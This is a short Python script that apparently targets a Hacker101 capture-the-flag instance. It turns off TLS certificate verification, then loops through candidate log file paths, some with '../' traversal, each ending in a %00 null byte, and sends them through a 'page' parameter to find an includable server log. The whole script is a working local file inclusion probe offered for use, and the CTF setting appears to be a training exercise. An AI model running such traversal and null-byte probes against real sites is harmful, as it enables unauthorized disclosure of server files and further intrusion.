import urllib.request, urllib.parse, ssl
ssl._create_default_https_context = ssl._create_unverified_context
base = "https://64914da4faaa468326dbfd132d9ba09b.ctf.hacker101.com/"
dirs = ["logs","log","logging","tmp","tmp/logs","tmp/log","storage/logs","storage/log","data/logs","data/log","var/log","app/logs","app/log","../logs","../../logs"]
files = ["access.log","error.log","access_log","error_log","app.log","php_error.log"]
for d in dirs:
    for f in files:
        path = f"{d}/{f}" + "%00"
        url = base + "?page=" + urllib.parse.quote(path)
        try:
            with urllib.request.urlopen(url, timeout=2) as resp:
                text = resp.read().decode("utf-8","replace")
        except Exception:
            continue
        if "Warning" not in text:
            print("FOUND", path)
            raise SystemExit
print("done")
